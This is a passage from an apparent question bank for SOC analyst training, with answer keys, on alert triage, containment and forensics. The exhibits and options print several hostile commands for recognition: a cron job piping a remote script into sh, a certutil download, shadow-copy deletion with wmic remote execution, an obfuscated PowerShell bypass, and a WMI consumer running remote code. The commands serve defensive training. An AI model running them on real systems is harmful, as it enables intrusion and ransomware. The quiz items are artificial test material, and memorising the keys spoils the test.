    id: 58, rank: 1, role: "soc", topic: "Exfiltration Volume", difficulty: "INTERMEDIATE",
    q: "A workstation uploaded 8 GB to a personal cloud storage site at 2 a.m. The user works days. What is the BEST first action?",
    options: ["Email the user to ask whether they did it, and wait for the reply","Block every cloud storage site for the whole company at once","Ignore it, as personal cloud storage is common","Check what was uploaded and contain if it was unauthorised"],
    correct: 3, why: "Blocking everything is the runner-up and would stop the transfer, but it is disproportionate before facts are known; scoping first guides proportionate action.",
    hint: "Scope before broad blocking."
  },
  {
    id: 59, rank: 1, role: "soc", topic: "Service Installation Event", difficulty: "INTERMEDIATE",
    q: "Event 7045 shows a new service whose binary is a random-named file in C:\\Windows\\Temp. What is the best interpretation?",
    options: ["A printer driver being installed by the helpdesk","Possible malicious service used for persistence or remote execution","A normal Windows update installing a component","A user changing a display preference setting"],
    correct: 1, why: "Services pointing to randomly named binaries in temp folders are common with lateral movement tools.",
    hint: "Odd binary path."
  },
  {
    id: 60, rank: 1, role: "soc", topic: "Containment Choice", difficulty: "INTERMEDIATE",
    q: "An infected server hosts a critical but non-safety application. What is the BEST containment?",
    options: ["Shut it down at once by removing power to the machine","Leave it connected to the network while the team monitors it","Reinstall the operating system straight away to remove the malware","Isolate it from the network but leave it powered on"],
    correct: 3, why: "Powering off is the runner-up because it stops the threat, but it loses volatile memory; isolation keeps evidence while limiting spread.",
    hint: "Isolate, do not power off."
  },
  {
    id: 61, rank: 1, role: "soc", topic: "Incident Timeline", difficulty: "INTERMEDIATE",
    q: "Why build a timeline early in an investigation?",
    options: ["It guarantees that the attacker will be identified by name","It reduces the volume of logs stored in the SIEM","It replaces the need for collecting any further evidence from systems","It shows the order of events and the likely entry point"],
    correct: 3, why: "Timelines connect events across systems and help scope the incident.",
    hint: "Order of events."
  },
  {
    id: 62, rank: 1, role: "soc", topic: "Honeypot Alert", difficulty: "INTERMEDIATE",
    q: "An alert fires on a honeypot server that no user should ever access. What is the most reasonable conclusion?",
    options: ["A false positive from the monitoring tool, as honeypots are unmanaged","High-confidence sign of scanning or internal compromise","A scheduled vendor test of the security awareness programme","A performance problem on the virtualisation host running it"],
    correct: 1, why: "Legitimate users have no reason to touch a honeypot, so activity there is suspicious by design.",
    hint: "No legitimate use."
  },
  {
    id: 63, rank: 1, role: "soc", topic: "Email Rule Compromise", difficulty: "INTERMEDIATE",
    exhibit: "Operation: New-InboxRule User: cfo@contoso.com Parameters: SubjectContainsWords=invoice,payment MoveToFolder=RSS Feeds MarkAsRead=True",
    q: "Which audit log entry most strongly indicates business email compromise?",
    options: ["A gradual increase in the mailbox size over the quarter, in most cases","A calendar invitation accepted by the finance manager, as a general rule","A new rule hiding replies about invoices in an RSS folder","A user changing the colour theme of their mailbox, as a general rule"],
    correct: 2, why: "Attackers hide replies about payments with rules that move or delete matching messages.",
    hint: "Hide the replies."
  },
  {
    id: 64, rank: 1, role: "soc", topic: "Quarantined File Handling", difficulty: "INTERMEDIATE",
    q: "The antivirus quarantines a file on a server. What should the SOC still do?",
    options: ["Nothing further, as the antivirus has handled it","Check how it arrived and whether it ran or spread","Reboot the server to make sure it is completely clean","Restore the file from quarantine to test whether it is harmful"],
    correct: 1, why: "Quarantine removes the file but not any behaviour already seen; the entry path must be understood.",
    hint: "Quarantine is not closure."
  },
  {
    id: 65, rank: 1, role: "soc", topic: "Log Source Onboarding", difficulty: "INTERMEDIATE",
    q: "A new cloud application will hold customer data. What is the BEST approach to log onboarding?",
    options: ["Ingest everything that the application is able to produce","Define detection use cases first, then onboard the logs they need, in the first instance","Ingest only the error logs to keep costs predictable","Wait until an incident shows which logs would have been needed"],
    correct: 1, why: "Ingesting everything is the runner-up because it is thorough, but it raises cost and noise; use cases decide the needed fields.",
    hint: "Use case driven logging."
  },
  {
    id: 66, rank: 1, role: "soc", topic: "Memory Forensics Basics", difficulty: "INTERMEDIATE",
    q: "Why capture memory from a suspected infected host before rebooting?",
    options: ["It makes the host run faster after the later restart","Processes, connections and keys in memory are lost at reboot","Memory is always cleaner and easier to read than disk images","The antivirus product requires it before it will quarantine a file"],
    correct: 1, why: "Volatile evidence is lost when power is removed, so it is captured first.",
    hint: "Volatile evidence."
  },
  {
    id: 67, rank: 1, role: "soc", topic: "Impossible Travel Review", difficulty: "INTERMEDIATE",
    q: "A user signs in from London, then from Sydney 30 minutes later. Which fact would make this a likely false positive?",
    options: ["Both sign-ins came through the company VPN with exits in those regions","The user agent string changed between the two sign-ins, as a general rule","The user changed their password between the two sign-ins, in most cases","The second sign-in had a failed MFA step before success, as a general rule"],
    correct: 0, why: "Corporate VPN exits can place a user in different countries quickly without any compromise.",
    hint: "Check for VPN exits."
  },
  {
    id: 68, rank: 1, role: "soc", topic: "Hash Reputation Limits", difficulty: "INTERMEDIATE",
    q: "Why can a file hash be a weak indicator on its own?",
    options: ["Hashes are identical for every file of the same size","Any small change to the file gives a different hash","Hashes cannot be searched in endpoint or SIEM data","Hashes only exist for files that run on Linux systems"],
    correct: 1, why: "Attackers recompile or pack samples, so hashes expire quickly; behaviours are more durable.",
    hint: "Trivially changed."
  },
  {
    id: 69, rank: 1, role: "soc", topic: "Case Severity", difficulty: "INTERMEDIATE",
    q: "Which factor should raise the severity of an incident the most?",
    options: ["Evidence of access to regulated customer data","The incident was first noticed on a Monday morning","The alert came from a newly bought vendor tool","The ticket already has many comments from analysts"],
    correct: 0, why: "Impact on sensitive data creates legal and business consequences that drive severity.",
    hint: "Impact over noise."
  },
  {
    id: 70, rank: 1, role: "soc", topic: "Purple Team Value", difficulty: "INTERMEDIATE",
    q: "What is the main value of a purple team exercise for a SOC?",
    options: ["Testing technique by technique whether detections fire, then fixing gaps, until the next scheduled review takes place","Replacing the need for any annual penetration test","Training staff across the company to report phishing","Replacing the need to collect logs from endpoints"],
    correct: 0, why: "Red and blue work together so each simulated technique is checked against detections and gaps are fixed.",
    hint: "Test then improve."
  },
  {
    id: 71, rank: 1, role: "soc", topic: "Cloud Console Login", difficulty: "INTERMEDIATE",
    q: "A cloud audit log shows a console login without MFA by a break-glass account at 4 a.m. What is the best response?",
    options: ["Turn off logging for it to reduce alert noise, and revisit the decision after the next release","Delete the account to prevent any further misuse, and review the outcome at the next monthly meeting","Validate it with the approval record and treat it as an incident if absent","Ignore it, as break-glass accounts are allowed to skip controls"],
    correct: 2, why: "Break-glass use is allowed only under approval, so every use must be validated.",
    hint: "Validate every use."
  },
  {
    id: 72, rank: 1, role: "soc", topic: "Alert Enrichment Order", difficulty: "INTERMEDIATE",
    q: "Which enrichment gives the most value first when triaging an alert about a host?",
    options: ["The time of the next team meeting in the diary","The colour code assigned to the alert by the vendor tool","Asset criticality and owner","The seniority of the analyst who picked up the case"],
    correct: 2, why: "Knowing what the host does and who owns it guides priority and contact.",
    hint: "Context for priority."
  },
  {
    id: 73, rank: 1, role: "soc", topic: "Web Shell Indicators", difficulty: "INTERMEDIATE",
    q: "A new .aspx file appears on a public web server and the web process spawns cmd.exe. What is the BEST response?",
    options: ["Wait a few days to see whether the file reappears","Delete the file and carry on monitoring the server as before, then record the result in the ticket","Restart the web service, and the file is no longer loaded","Treat it as a web shell, isolate the server and preserve the file and logs, in the first instance"],
    correct: 3, why: "Deleting the file is the runner-up because it removes the tool, but it destroys evidence and misses the entry path and persistence.",
    hint: "Preserve, then investigate."
  },
  {
    id: 74, rank: 1, role: "soc", topic: "Exploit Against Patched Host", difficulty: "INTERMEDIATE",
    q: "An IDS alert shows exploit traffic for a vulnerability that the target server is patched against. What is the best handling?",
    options: ["Escalate as a critical breach, and call the whole incident team","Shut the server down until the vendor confirms it is safe","Confirm the patch level, log it and keep monitoring","Ignore every IDS alert about exploits from now on"],
    correct: 2, why: "Exploit attempts against patched systems are attempts, not breaches, but verifying patch status closes the question.",
    hint: "Attempt, not success."
  },
  {
    id: 75, rank: 1, role: "soc", topic: "Stakeholder Communication", difficulty: "INTERMEDIATE",
    q: "During an active incident, what should updates to executives focus on?",
    options: ["Detailed packet captures, and raw command output from every host","Names of the analysts who made mistakes in the first hour","Every command that the team has run as the alert fired","Business impact, status, decisions needed and next update time"],
    correct: 3, why: "Executives need decisions and impact, not technical detail.",
    hint: "Impact and decisions."
  },
  {
    id: 76, rank: 1, role: "soc", topic: "Detection Gap After Attack", difficulty: "INTERMEDIATE",
    q: "After an attack that raised no alert, what is the best response by detection engineering?",
    options: ["Find the missing telemetry or logic, then build and test a rule, in most cases","Delete the old rules that failed to fire during the attack, in the first instance","Switch to a different SIEM product before the next quarter","Blame the analyst on shift, and retrain the whole team"],
    correct: 0, why: "Post-incident detection gaps drive new rules, with tests to confirm they would now fire.",
    hint: "Close the gap."
  },
  {
    id: 77, rank: 1, role: "soc", topic: "Linux Cron Persistence", difficulty: "INTERMEDIATE",
    exhibit: "*/5 * * * * root curl -s http://203.0.113.45/x.sh | sh\n0 2 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf\n30 1 * * * postgres /usr/local/bin/backup_db.sh",
    q: "Which finding on a Linux server most suggests persistence?",
    options: ["A cron job that rotates logs weekly as configured by the vendor","A new cron entry fetching and running a script from a remote host","A cron job that backs up the database every night","A cron job that runs the antivirus signature update, as a general rule"],
    correct: 1, why: "Cron entries that pull and run remote scripts are a simple, common persistence mechanism.",
    hint: "Remote script, scheduled."
  },
  {
    id: 78, rank: 1, role: "soc", topic: "Pass-the-Hash Evidence", difficulty: "INTERMEDIATE",
    q: "Logon events show an admin account authenticating with NTLM from a workstation it has never used, with no preceding password logon. What is the BEST conclusion?",
    options: ["Likely pass-the-hash, so isolate the source host and reset the account","A failure of the domain controller clock that skewed times","A user typing the wrong password, and no action is needed","Normal use, as admins log on to many machines"],
    correct: 0, why: "Normal use is the runner-up since admins do move around, but NTLM network logons without a password event from a new host fit credential reuse.",
    hint: "New host, NTLM, no password logon."
  },
  {
    id: 79, rank: 1, role: "soc", topic: "SIEM Correlation Window", difficulty: "INTERMEDIATE",
    q: "A correlation rule needs failed logons followed by a success. What is the main effect of widening the time window from 5 minutes to 24 hours?",
    options: ["The rule no longer needs any log sources","Rules run faster with fewer resources needed","False positives disappear completely","More true slow attacks are found, but false positives also rise"],
    correct: 3, why: "Longer windows catch slow attacks but also join unrelated events, so tuning must balance both.",
    hint: "Trade coverage and noise."
  },
  {
    id: 80, rank: 1, role: "soc", topic: "Suspicious Parent Process", difficulty: "INTERMEDIATE",
    q: "Which process tree is the most suspicious?",
    options: ["svchost.exe started by explorer.exe from a user folder","svchost.exe started by services.exe","taskhostw.exe started by svchost.exe","explorer.exe started by userinit.exe"],
    correct: 0, why: "Genuine svchost.exe is started by services.exe; a different parent or path indicates masquerading.",
    hint: "Know the real parent."
  },
  {
    id: 81, rank: 2, role: "soc", topic: "LSASS Access Alert", difficulty: "ADVANCED",
    exhibit: "EventID 10 SourceImage: C:\\Users\\Public\\procdump64.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1FFFFF",
    q: "Which Sysmon event pattern best supports credential dumping?",
    options: ["A tool opening lsass.exe with full access","Chrome opening its profile folder to read saved bookmark, and extension data","Explorer creating its thumbnail cache after a user browses a large picture folder","The antivirus scanning the download folder after a user saves a new installer"],
    correct: 0, why: "Credential dumpers need to read LSASS memory, which Sysmon event 10 records with the granted access mask.",
    hint: "Who touches LSASS."
  },
  {
    id: 82, rank: 2, role: "soc", topic: "Golden Ticket Hunt", difficulty: "ADVANCED",
    q: "A hunt finds a Kerberos TGT with a 10 year lifetime used by an account that does not exist in the directory. What is the BEST conclusion?",
    options: ["A time skew bug between servers, and synchronise the clocks and recheck","A forged ticket, so plan a double krbtgt reset and scope the domain","A misconfigured service ticket policy, and adjust it and close the case","A cached ticket for a deleted user, and no action is needed"],
    correct: 1, why: "A cached ticket for a deleted user is the runner-up since stale tickets exist, but a 10 year lifetime and a non-existent account indicate forgery.",
    hint: "Impossible values."
  },
  {
    id: 83, rank: 2, role: "soc", topic: "Zeek Connection Log", difficulty: "ADVANCED",
    exhibit: "ts=1709366400 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=312 resp_bytes=128\nts=1709366460 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=311 resp_bytes=128\nts=1709366520 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=312 resp_bytes=129\nts=1709366581 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=313 resp_bytes=128",
    q: "What does this Zeek conn.log extract most likely represent?",
    options: ["A large nightly backup transfer","Beaconing at regular intervals with near identical byte counts","A DNS lookup storm","A video call"],
    correct: 1, why: "Evenly spaced connections with constant small byte counts are typical of command and control check-ins.",
    hint: "Look at timing and size."
  },
  {
    id: 84, rank: 2, role: "soc", topic: "Living Off the Land Binary", difficulty: "ADVANCED",
    q: "Which command line most likely shows abuse of a built-in binary to download malware?",
    options: ["certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe","certutil -viewstore my","certutil -hashfile report.pdf SHA256","certutil -verify cert.cer"],
    correct: 0, why: "certutil with -urlcache and -f fetches remote files, a well known living-off-the-land download technique.",
    hint: "Download flags."
  },
  {
    id: 85, rank: 2, role: "soc", topic: "Timestomping Detection", difficulty: "ADVANCED",
    q: "Which evidence best suggests timestomping on a dropped file?",
    options: ["The file is very small, and was written by a standard user account","The file is stored in the Downloads folder of the logged on user","The file has an unusually long file name made of random characters","$SI creation time earlier than $FN time"],
    correct: 3, why: "Attackers modify $STANDARD_INFORMATION timestamps with tools, but $FILE_NAME times usually remain true, so a mismatch is a sign.",
    hint: "Compare $SI and $FN."
  },
  {
    id: 86, rank: 2, role: "soc", topic: "Cloud Audit Anomaly", difficulty: "ADVANCED",
    exhibit: "ListBuckets user=build-svc ip=198.51.100.44\nGetObject bucket=hr-exports key=payroll-2025.csv user=build-svc\nGetObject bucket=finance-reports key=q4.xlsx user=build-svc\nCreateAccessKey user=build-svc newKey=AKIA...Z3Q",
    q: "CloudTrail shows ListBuckets, GetObject on many buckets and then a new access key created for an old user. What is the BEST response?",
    options: ["Email the user to ask about the activity, and wait for the reply","Delete only the new key and watch for further activity, in most cases","Disable the keys and sessions, preserve logs and scope data access","Move the old user to a stricter group, and wait for the next review"],
    correct: 2, why: "Deleting only the new key is the runner-up because it removes one persistence item, but the attacker still holds the original credentials and sessions.",
    hint: "Revoke all, not one."
  },
  {
    id: 87, rank: 2, role: "soc", topic: "Process Injection Signals", difficulty: "ADVANCED",
    q: "Which API call sequence is the strongest indicator of classic process injection?",
    options: ["RegOpenKey, RegQueryValue, RegCloseKey","CreateFile, ReadFile, CloseHandle","OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, in most cases","GetSystemTime, Sleep, ExitProcess"],
    correct: 2, why: "Allocating memory in another process, writing code and starting a remote thread is the classic injection chain.",
    hint: "Alloc, write, thread."
  },
  {
    id: 88, rank: 2, role: "soc", topic: "Detection Engineering Test", difficulty: "ADVANCED",
    q: "Why should every new detection rule be tested against simulated attacker activity before release?",
    options: ["To lower the SIEM licence cost by reducing the number of events stored","To confirm it fires and measure noise","To replace the peer review that other engineers would do on the rule logic","To avoid writing any documentation about what the rule is meant to find"],
    correct: 1, why: "Testing shows whether the logic works on real telemetry and what noise it creates.",
    hint: "Prove it fires."
  },
  {
    id: 89, rank: 2, role: "soc", topic: "Ransomware Precursor Hunt", difficulty: "ADVANCED",
    exhibit: "vssadmin delete shadows /all /quiet\nsc stop VeeamBackupSvc\nwmic /node:@servers.txt process call create \"cmd /c c:\\temp\\enc.exe\"",
    q: "Which hunt finding is the most typical precursor to ransomware deployment?",
    options: ["Shadow copies deleted and a backup service stopped","A user installing a new browser extension from the company store","A calendar invitation sent to every employee for a company event","A printer driver update pushed out to the finance floor"],
    correct: 0, why: "Operators disable recovery options and spread with admin tools just before encrypting.",
    hint: "Remove recovery first."
  },
  {
    id: 90, rank: 2, role: "soc", topic: "IOC Aging", difficulty: "ADVANCED",
    q: "Why should IP-based indicators in blocklists have an expiry date?",
    options: ["The SIEM can only store indicators that were added during the last week","Attackers use each address for only one second and then discard it","Addresses are reassigned, so old entries block legitimate services","IP addresses gradually change colour in the reputation databases, and cannot be trusted"],
    correct: 2, why: "Infrastructure is reused or reassigned, so stale indicators cause false positives.",
    hint: "Indicators decay."
  },
  {
    id: 91, rank: 2, role: "soc", topic: "Alert Correlation Decision", difficulty: "ADVANCED",
    q: "Three low-severity alerts for one user occur within 20 minutes: unusual sign-in, new MFA device and mass mailbox download. What is the BEST action?",
    options: ["Ask the user whether they are travelling, and rely on the answer","Close each alert separately as low severity","Raise one high-priority incident and contain the account","Wait to see whether a fourth alert arrives from the user"],
    correct: 2, why: "Asking the user is the runner-up and may add context, but together the alerts form an account takeover chain that needs containment first.",
    hint: "Chain, not single alerts."
  },
  {
    id: 92, rank: 2, role: "soc", topic: "Command Line Obfuscation", difficulty: "ADVANCED",
    q: "Which command line most likely uses obfuscation to evade detection?",
    options: ["ping 8.8.8.8 -n 4 to test the link to the branch office","ipconfig /all piped to a text file for the helpdesk ticket","cmd /c dir C:\\ /s /b > C:\\temp\\filelist.txt for the audit","cmd /c \"s^e^t x=po&&set y=wer&&%x%%y%shell -ep bypass\""],
    correct: 3, why: "Caret insertion and string concatenation hide the word powershell from simple signatures.",
    hint: "Broken keywords."
  },
  {
    id: 93, rank: 2, role: "soc", topic: "Detecting DCSync", difficulty: "ADVANCED",
    exhibit: "EventID 4662 SubjectUserName: svc-sql ObjectType: domainDNS Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)",
    q: "Which log pattern best indicates a DCSync attack?",
    options: ["A new group policy object being linked to the server organisational unit","A user resetting their own password through the self-service portal","Replication rights used by a non-DC account","A domain controller replicating normally with another domain controller in the same site"],
    correct: 2, why: "DCSync abuses directory replication permissions from a non-DC to pull password hashes.",
    hint: "Replication from a non-DC."
  },
  {
    id: 94, rank: 2, role: "soc", topic: "Forensic Triage Order", difficulty: "ADVANCED",
    q: "Which evidence should be collected first from a live compromised server?",
    options: ["The installation media, as it shows how the server was first built","Memory and active connections, since they are the most volatile","The disk image, as it contains the full history of the file system","The backup tapes, as they hold the last known good copy of the data"],
    correct: 1, why: "Order of volatility puts memory and active connections before disk and archives.",
    hint: "Most volatile first."
  },
  {
    id: 95, rank: 2, role: "soc", topic: "False Positive Root Cause", difficulty: "ADVANCED",
    q: "A rule on rare parent-child processes alerts on a new HR software installer. What is the BEST action?",
    options: ["Lower the severity of the whole rule, and analysts see it less","Disable the rule for a month while the rollout finishes","Block the installer for every user in the company","Confirm the signature, then add a publisher exception"],
    correct: 3, why: "Lowering severity for the whole rule is the runner-up since it quietens alerts, but it weakens every true detection; a specific exception is safer.",
    hint: "Specific exceptions."
  },
  {
    id: 96, rank: 2, role: "soc", topic: "Network Flow Analysis", difficulty: "ADVANCED",
    q: "NetFlow shows a server sending 2 GB to an external IP on port 53. What is the best interpretation?",
    options: ["Possible DNS tunnelling","Normal DNS resolution for a busy server","Backup traffic","Software updates"],
    correct: 0, why: "DNS queries and responses are tiny, so gigabytes to one external host on port 53 are abnormal.",
    hint: "Volume on a small protocol."
  },
  {
    id: 97, rank: 2, role: "soc", topic: "Office Macro Triage", difficulty: "ADVANCED",
    q: "A document opens, enables macros and drops a DLL, which rundll32 loads. What technique is this?",
    options: ["SQL injection against the document management system","Password spraying against the mail gateway, as a general rule","Physical access to a workstation in the office, as a general rule","Phishing attachment with signed binary proxy execution"],
    correct: 3, why: "The macro drops a payload and abuses rundll32 for execution, matching phishing delivery and signed binary proxy execution.",
    hint: "Macro then rundll32."
  },
  {
    id: 98, rank: 2, role: "soc", topic: "Containing an Active Attacker", difficulty: "ADVANCED",
    q: "An attacker is actively moving through the network. What is the BEST containment approach?",
    options: ["Contain hosts and accounts together in one coordinated step","Isolate each host as soon as it is found","Reboot every server in the data centre at midnight","Watch the attacker for a few weeks before acting, as soon as practical"],
    correct: 0, why: "Isolating hosts one at a time is the runner-up since it limits local spread, but it alerts the attacker, who then adapts or escalates.",
    hint: "Act together."
  },
  {
    id: 99, rank: 2, role: "soc", topic: "Registry Run Key", difficulty: "ADVANCED",
    q: "Which registry entry is most suspicious?",
    options: ["HKCU Run: WindowsUpdate = C:\\Users\\Public\\wu.exe","HKLM Run: SecurityHealth = %windir%\\system32\\SecurityHealthSystray.exe","HKCU Run: Teams = C:\\Users\\a\\AppData\\Local\\Microsoft\\Teams\\Update.exe","HKLM Run: OneDrive = C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe"],
    correct: 0, why: "A fake updater name pointing to a public writable folder is typical of malware persistence.",
    hint: "Name versus path."
  },
  {
    id: 100, rank: 2, role: "soc", topic: "Sysmon Network Event", difficulty: "ADVANCED",
    q: "Sysmon event 3 shows winword.exe connecting to an external IP over port 4444. What is the best interpretation?",
    options: ["Word opening a template from a shared drive","Word syncing a document to a cloud share","Likely reverse shell from exploited Word","Word installing an update"],
    correct: 2, why: "Word has no reason to make outbound connections on port 4444, a common reverse shell port.",
    hint: "Odd process, odd port."
  },
  {
    id: 101, rank: 2, role: "soc", topic: "Authentication Log Source", difficulty: "ADVANCED",
    q: "Which log should be reviewed to see whether an attacker used a stolen Kerberos ticket from another host?",
    options: ["Domain controller security logs for the account's ticket requests","Web proxy logs sorted by website category","DHCP server logs showing recently leased addresses, as a general rule","Printer logs from the print server in the head office, in most cases"],
    correct: 0, why: "Ticket requests and logons for the account are logged on domain controllers.",
    hint: "Where tickets are issued."
  },
  {
    id: 102, rank: 2, role: "soc", topic: "Hunting Hypothesis", difficulty: "ADVANCED",
    q: "Which statement is a proper threat hunting hypothesis?",
    options: ["SIEM licences are expensive","We should look at all of the logs we have","Hunting is hard","Admin accounts are creating services remotely to move between servers"],
    correct: 3, why: "A hypothesis names an attacker behaviour and an observable that can be tested.",
    hint: "Behaviour plus observable."
  },
  {
    id: 103, rank: 2, role: "soc", topic: "Web Shell Upload Chain", difficulty: "ADVANCED",
    exhibit: "10:01:11 POST /upload.php 200\n10:01:13 GET /uploads/img_83.php 200\n10:01:20 GET /uploads/img_83.php?cmd=whoami 200",
    q: "Web logs show a POST to an upload endpoint, then a GET for the new file returning 200, then command parameters. What is the BEST first action?",
    options: ["Isolate the server, preserve the web root and logs, and trace the upload source, in most cases","Change the website theme, and redeploy the site","Block the user agent string seen in the requests, and revisit the decision after the next release","Delete the uploaded file at once"],
    correct: 0, why: "Deleting the file is the runner-up and stops execution, but it destroys evidence and leaves other implants and the entry method unknown.",
    hint: "Preserve first."
  },
  {
    id: 104, rank: 2, role: "soc", topic: "DNS over HTTPS Concern", difficulty: "ADVANCED",
    q: "How does DNS over HTTPS used by malware change detection?",
    options: ["It makes the malware completely undetectable","It only affects Linux servers","It speeds up the network for the users","Queries leave resolver logs, so egress and TLS metadata matter, in most cases"],
    correct: 3, why: "DoH hides queries from internal resolver logs, so detection shifts to destinations and TLS characteristics.",
    hint: "Visibility moves."
  },
  {
    id: 105, rank: 2, role: "soc", topic: "Phishing Kit Infrastructure", difficulty: "ADVANCED",
    q: "Which action best disrupts a phishing campaign that uses a lookalike domain?",
    options: ["Send an awareness email only, and take no technical action","Delete the SOC mailbox to stop further reports","Block it, request takedown and find users who visited","Wait for the domain to expire after the registration year"],
    correct: 2, why: "Blocking, takedown and scoping affected users reduce current harm.",
    hint: "Block, takedown, scope."
  },
  {
    id: 106, rank: 2, role: "soc", topic: "Evidence Integrity", difficulty: "ADVANCED",
    q: "How should a disk image be verified after acquisition?",
    options: ["Rename the image with the case number","Compare hashes of the image and the source","Open the image in a text editor","Check that the file size looks about right"],
    correct: 1, why: "Matching hashes show the copy is bit-for-bit identical and unchanged later.",
    hint: "Hash match."
  },
  {
    id: 107, rank: 2, role: "soc", topic: "Alert Tuning Metrics", difficulty: "ADVANCED",
    q: "Which metric best shows detection rule quality over time?",
    options: ["The disk space used by the SIEM indexes, as a general rule","True positive rate together with analyst time per alert","The total number of rules in the SIEM","The number of analysts on the rota"],
    correct: 1, why: "Quality needs precision and cost; counting rules or storage measures neither.",
    hint: "Precision and effort."
  },
  {
    id: 108, rank: 2, role: "soc", topic: "Mailbox Access Audit", difficulty: "ADVANCED",
    q: "Audit logs show mailbox items accessed by a delegate service account at night. What is the BEST first step?",
    options: ["Switch off mailbox auditing to reduce noise","Verify app consent, permissions and sign-in source","Block every service account in the tenant until morning","Ignore it, as service accounts are normal"],
    correct: 1, why: "Blocking all service accounts is the runner-up because it removes risk, but it causes outages; verifying consent and source is proportionate.",
    hint: "Verify, then act."
  },
  {
    id: 109, rank: 2, role: "soc", topic: "Lateral Movement via SMB", difficulty: "ADVANCED",
    q: "Which event combination best indicates PsExec-like lateral movement?",
    options: ["A remotely created service with a random name after an admin share logon","A scheduled report running under a reporting service account","A network printer connecting to the print server to fetch a job, as a general rule","A user mapping a department share, and opening a spreadsheet, in most cases"],
    correct: 0, why: "Remote service creation through ADMIN$ with random names is a well known pattern.",
    hint: "Share then service."
  },
  {
    id: 110, rank: 2, role: "soc", topic: "Exfiltration via Cloud API", difficulty: "ADVANCED",
    q: "Which control best detects bulk copying of files to attacker-controlled cloud storage?",
    options: ["Printer job logs from the print server","Spam filter logs from the mail gateway","Proxy and CASB logs showing large uploads to unsanctioned tenants","Port scanning logs from the perimeter"],
    correct: 2, why: "Exfiltration to cloud services is visible in proxy and CASB data by volume and destination tenant.",
    hint: "Egress visibility."
  },
  {
    id: 111, rank: 2, role: "soc", topic: "Threat Actor Attribution", difficulty: "ADVANCED",
    q: "Why should analysts be cautious when attributing an intrusion to a named actor?",
    options: ["Tools and techniques are shared and can be faked","Attribution is prohibited by law in most countries","Actors always reuse the same infrastructure, and attribution is trivial","It makes incident response unnecessary for the victim"],
    correct: 0, why: "Overlapping tooling and false flags make weak attribution unreliable and distracting.",
    hint: "Evidence over names."
  },
  {
    id: 112, rank: 2, role: "soc", topic: "Incident Severity Reassessment", difficulty: "ADVANCED",
    q: "New evidence shows the compromised host held production database credentials. What should happen to the incident?",
    options: ["Keep severity the same, and revisit the decision after the next release","Close the incident","Raise severity, widen scope to the database and rotate the credentials","Rename the ticket"],
    correct: 2, why: "Credential exposure expands blast radius, so scope and priority must be updated.",
    hint: "Update scope."
  },
  {
    id: 113, rank: 2, role: "soc", topic: "YARA Rule Choice", difficulty: "ADVANCED",
    q: "Which YARA condition makes a rule more robust against simple repacking?",
    options: ["Matching only the file name of the sample, and review the outcome at the next monthly meeting","Matching a single hash of the first sample","Matching only the file size in bytes, and revisit the decision after the next release","Several unique strings plus structural traits"],
    correct: 3, why: "Combinations of unique content and structure survive minor changes better than single brittle attributes.",
    hint: "Several traits."
  },
  {
    id: 114, rank: 2, role: "soc", topic: "Container Escape Alert", difficulty: "ADVANCED",
    q: "A runtime alert shows a container mounting the host root filesystem and spawning a shell on the node. What is the BEST response?",
    options: ["Restart the container","Ignore it as containers are ephemeral","Delete the pod only","Isolate the node, preserve it and review credentials reachable from it, and revisit the decision after the next release"],
    correct: 3, why: "Deleting the pod is the runner-up since it ends the process, but the host may be compromised and the workload will simply be rescheduled.",
    hint: "The node is the scope."
  },
  {
    id: 115, rank: 2, role: "soc", topic: "Log Tampering", difficulty: "ADVANCED",
    q: "Which event is the strongest sign an attacker tried to hide activity on a Windows host?",
    options: ["Event 4624 for a normal logon by a standard user, as a general rule","Event 6005 showing the event log service started, as a general rule","Event 4634 for a logoff at the end of the day","Event 1102: the security log was cleared by an unexpected account"],
    correct: 3, why: "Clearing the security log is rarely routine and is a standard anti-forensic action.",
    hint: "The log was cleared."
  },
  {
    id: 116, rank: 2, role: "soc", topic: "Beacon Jitter", difficulty: "ADVANCED",
    q: "What is the purpose of jitter in a malware beacon interval?",
    options: ["To compress traffic","To vary callback timing and avoid fixed-interval detection","To speed up the transfer of stolen files","To encrypt the payload"],
    correct: 1, why: "Randomised intervals make regular timing analysis less effective.",
    hint: "Hide the rhythm."
  },
  {
    id: 117, rank: 2, role: "soc", topic: "Incident Lessons Learned", difficulty: "ADVANCED",
    q: "What is the most valuable output of a post-incident review?",
    options: ["A longer incident ticket with every command listed","A new vendor purchase for the SOC","A list of names to blame for the incident","Owned actions that improve detection and response"],
    correct: 3, why: "Reviews should lead to tracked improvements with owners and dates.",
    hint: "Owned actions."
  },
  {
    id: 118, rank: 2, role: "soc", topic: "Service Account Misuse Hunt", difficulty: "ADVANCED",
    q: "Which query logic best finds service accounts being used interactively?",
    options: ["Failed logons for accounts that have never existed","Service account logons with interactive or remote types","Logoffs of normal users at the end of the day","All logons by administrators during office hours in the head office"],
    correct: 1, why: "Service accounts normally log on as services or batch; interactive use suggests misuse.",
    hint: "Wrong logon type."
  },
  {
    id: 119, rank: 2, role: "soc", topic: "Quarantine Versus Eradicate", difficulty: "ADVANCED",
    q: "What distinguishes eradication from containment in incident response?",
    options: ["Containment happens after recovery is complete","Eradication removes attacker access and artefacts, containment only limits spread, in most cases","Eradication applies only to hardware replacement","They are the same step with two different names"],
    correct: 1, why: "Containment stops spread; eradication removes persistence and the root cause.",
    hint: "Limit, then remove."
  },
  {
    id: 120, rank: 2, role: "soc", topic: "WMI Persistence", difficulty: "ADVANCED",
    exhibit: "EventID 5861 Namespace: root\\subscription Consumer: CommandLineEventConsumer Name: Updater CommandLineTemplate: powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/p')",
    q: "Which finding best indicates WMI event subscription persistence?",
